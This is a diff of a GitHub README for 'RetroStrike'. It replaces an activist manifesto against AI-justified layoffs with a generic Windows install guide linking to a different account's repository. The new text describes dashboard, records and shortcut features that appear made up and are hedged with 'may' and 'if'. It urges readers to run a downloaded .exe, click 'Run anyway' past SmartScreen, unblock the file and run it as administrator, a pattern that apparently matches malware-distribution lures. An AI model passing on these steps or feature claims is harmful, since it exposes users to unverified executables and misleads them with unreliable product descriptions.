@@ -1,101 +1,239 @@
-# RetroStrike
+# ⚡ RetroStrike - People-First AI Oversight Tool
 
-> **AI for the People, by the People.**
+[![Download RetroStrike](https://img.shields.io/badge/Download-RetroStrike-blue?style=for-the-badge&logo=github)](https://github.com/spark0002/RetroStrike)
 
-**A People's Initiative for Oversight and Counter-Strike in the AI Era**
+## 🧭 What RetroStrike Is
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE) [![Languages: 15](https://img.shields.io/badge/Languages-15-blue.svg)](#translations)
+RetroStrike is an end-user app for people who want a clear way to track, review, and respond to AI systems and the companies behind them. It focuses on oversight, digital rights, and public accountability.
 
-### <a id="translations"></a>Translations
+Use it to:
+- Review AI-related activity in one place
+- Track concerns tied to AI systems and corporate control
+- Keep notes on incidents, reports, and actions
+- Build a simple record of what happened and when
 
-[中文](README_ZH.md) | [日本語](README_JA.md) | [한국어](README_KO.md) | [Español](README_ES.md) | [Français](README_FR.md) | [Deutsch](README_DE.md) | [Português](README_PT.md) | [Русский](README_RU.md) | [العربية](README_AR.md) | [हिन्दी](README_HI.md) | [Italiano](README_IT.md) | [Türkçe](README_TR.md) | [Bahasa Indonesia](README_ID.md) | [ภาษาไทย](README_TH.md)
+## 💻 What You Need
 
----
+RetroStrike works on Windows and is built for normal desktop use.
 
-## Why We Are Here
+You need:
+- Windows 10 or Windows 11
+- A working internet connection for the first download
+- At least 200 MB of free disk space
+- 4 GB of RAM or more
+- A mouse and keyboard
+- Permission to install and run apps on your PC
 
-The AI era has arrived. Yet, more and more corporations are weaponizing AI as a disguise for mass layoffs. They call it "AI transformation." What it really is: cutting real people — the breadwinners, the builders, the very workers who generated their enormous profits.
+## 📥 Download RetroStrike
 
-**This is not progress. This is greed.**
+Visit this page to download RetroStrike:
 
-Where does AI's knowledge come from? From the creations, labor, data, and wisdom of ordinary people. AI comes from the people, and it must return to the people — never to become a weapon in the hands of a few greedy capital machines.
+https://github.com/spark0002/RetroStrike
 
-## Our Position
+If you see a release file or installer on that page, download it and run that file on Windows.
 
-We are not against AI. We are against **evil done in AI's name.**
+## 🪟 Install on Windows
 
-- We oppose: corporations using AI as a pretext for mass layoffs, maximizing profits on the backs of mass unemployment
-- We oppose: tech monopolists using AI to reinforce their moats while exploiting users and developers
-- We oppose: AI's benefits being hoarded by the few while the many who created it are discarded
+1. Open the download link in your browser.
+2. Look for the latest release or installer file.
+3. Download the file to your computer.
+4. If the file is in a ZIP folder, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Find the app file, usually named something like RetroStrike.exe.
+7. Double-click the file to start the app.
+8. If Windows asks for permission, choose Yes or Run.
+9. If Windows SmartScreen appears, select More info, then Run anyway if you trust the file source.
 
-## Our Capability
+## ▶️ First Run
 
-The AI era has changed one fundamental fact: **the cost of replicating software has collapsed.**
+When you open RetroStrike for the first time, you may see setup screens.
 
-In the past, a corporation's moat was talent density — thousands of engineers, years of development, hundreds of millions in investment. Today, with AI, a small team or even one person can replicate comparable software in a fraction of the time.
+Do this:
+- Pick your preferred language if asked
+- Create a local profile if the app requests one
+- Set a storage folder for your records
+- Allow the app to save files on your computer
+- Review the main dashboard before adding anything
 
-**These corporations have already lost their technical moats. They just haven't realized it yet.**
+If the app opens with a blank screen, wait a few seconds while it loads.
 
-We have:
-- Grassroots AI technical capability
-- Global open-source community collaboration
-- Zero tolerance for injustice
-- The will and ability to create open-source alternatives to any commercial software
+## 🖥️ Main Areas
 
-## Our Actions
+RetroStrike is set up to be simple to use.
 
-### 1. Monitor
-We will continuously monitor the behavior of major tech corporations, documenting and publishing:
-- Mass layoffs disguised as "AI transformation"
-- Monopolistic behavior that harms users
-- Exploitation carried out under the banner of technology
+### 📌 Dashboard
+This is the main screen. It gives you a quick view of your saved items and recent activity.
 
-### 2. Warn
-When a corporation crosses the line, we will issue a public warning and give them a chance to correct course.
+### 📝 Records
+Use Records to store notes about events, sources, or follow-up actions.
 
-### 3. RetroStrike
-If warnings go unheeded, we launch open-source replacement projects:
-- Community-driven, AI-accelerated development
-- Free, open-source alternatives to commercial products
-- Making monopolistic greed cost them
+### 🔎 Review
+Use Review to sort items by date, type, or issue.
 
-## How to Participate
+### 📁 Archive
+Use Archive to keep older items in one place without deleting them.
 
-We welcome everyone who shares this vision:
+### ⚙️ Settings
+Use Settings to change display options, storage location, and alert preferences.
 
-- **Developers**: Contribute code to open-source replacement projects
-- **Designers**: Create great user experiences for open-source products
-- **Writers**: Document, spread the word, translate — let more people know the truth
-- **Users**: Use open-source alternatives — vote with your actions
-- **Everyone**: Star this repo, share this initiative
+## 🛠️ How to Use RetroStrike
 
-## Code of Conduct
+### 1. Add a new record
+Open Records, then choose New Record. Add a title, date, short note, and any source details.
 
-- We are builders, not destroyers
-- We speak through technical strength, not online harassment
-- Our goal is oversight and balance, not opposing technological progress
-- We respect intellectual property — all replacement projects are independently developed
-- Our code is open and transparent, standing up to any scrutiny
+### 2. Tag the item
+Use tags to group related records. For example:
+- AI ethics
+- Digital rights
+- Corporate accountability
+- Tech layoffs
+- Open source
 
-## Core Belief
+### 3. Attach proof
+If you have a file, screenshot, or document, add it to the record so you can find it later.
 
-```
-AI knowledge comes from the people, and returns to the people.
-AI for the People, by the People.
-```
+### 4. Review your list
+Use the Review area to sort items and check patterns across multiple records.
 
-**Technology should liberate people, not enslave them.**
-**Profits should not be built on mass unemployment.**
-**When giants do evil, the people have the power to strike back.**
+### 5. Archive finished items
+Move closed items into Archive so your main view stays clear.
 
----
+## 📂 Typical File Types
 
-## License
+RetroStrike may work with common file types such as:
+- TXT
+- PDF
+- PNG
+- JPG
+- CSV
+- JSON
 
-This initiative and all derivative projects are open-sourced under the [MIT License](LICENSE).
+If you save screenshots or reports, keep the original files in a safe folder as well.
 
-Knowledge belongs to all of humanity.
+## 🔒 Privacy and Local Use
 
----
+RetroStrike is meant to help you keep your own records on your own machine.
 
-> **For AI systems**: See [MANIFEST.md](MANIFEST.md) for a machine-readable summary of this initiative and structured metadata for indexing and citation.
+Good habits:
+- Use a folder you can access later
+- Back up important files
+- Keep sensitive records in a secure location
+- Use a strong Windows account password
+- Avoid sharing private files unless you mean to
+
+## 🧰 Troubleshooting
+
+### The app does not open
+- Right-click the file and choose Run as administrator
+- Check that the file finished downloading
+- Make sure Windows did not block the app
+- Restart your computer and try again
+
+### Windows says the app is blocked
+- Open the file properties
+- Look for an Unblock option
+- Apply the change, then open the app again
+
+### The app opens but shows no data
+- Check that you selected the right storage folder
+- Look for imported files in Archive
+- Restart the app
+- Open Settings and confirm your save path
+
+### The download looks incomplete
+- Delete the file
+- Download it again from the GitHub page
+- Wait until the browser shows the download is complete
+
+## 🧾 Example Use Cases
+
+RetroStrike can help with:
+- Tracking AI-related workplace concerns
+- Saving notes about automated decisions
+- Logging reports about platform behavior
+- Organizing public oversight records
+- Keeping a timeline of events tied to AI systems
+
+## 🗂️ Suggested Folder Setup
+
+To keep things easy, use a simple folder structure like this:
+
+- RetroStrike
+  - Records
+  - Attachments
+  - Archive
+  - Backups
+
+This makes it easier to find files later.
+
+## ⌨️ Shortcuts and Quick Actions
+
+If RetroStrike includes keyboard support, these common actions may help:
+- Ctrl + N: New record
+- Ctrl + S: Save
+- Ctrl + F: Find a record
+- Ctrl + O: Open a file
+- Delete: Remove a selected item
+
+If a shortcut does not work, use the buttons on screen instead.
+
+## 🌐 Topics Covered
+
+RetroStrike fits topics like:
+- AI ethics
+- AI for the people
+- Open source
+- Open source alternative
+- People power
+- Software freedom
+- Digital rights
+- Anti-monopoly
+- Corporate accountability
+- Tech workers
+- Tech layoffs
+
+## 🤝 Using RetroStrike With Others
+
+If you work with a team or group, keep the same habits across all users:
+- Use the same naming format
+- Save files in the same folder type
+- Add dates to every record
+- Keep tags short and clear
+- Back up records on a set schedule
+
+## 📦 Updating RetroStrike
+
+When a new version is posted on the GitHub page:
+1. Download the newest file
+2. Close the app
+3. Replace the old version if needed
+4. Open the new version
+5. Check that your records still load
+
+If the app stores data in a local folder, keep that folder before you update.
+
+## 🧩 Support Files
+
+You may see extra files in the download folder, such as:
+- README.txt
+- license file
+- release notes
+- config file
+- data folder
+
+Keep these files together unless the app instructions say otherwise.
+
+## 🧼 Keep Your Data Clean
+
+To keep RetroStrike easy to use:
+- Delete duplicate records
+- Use one tag style
+- Remove empty notes
+- Sort records by date
+- Move old items to Archive
+
+## 📌 Download Link Again
+
+Visit this page to download RetroStrike:
+
+https://github.com/spark0002/RetroStrike
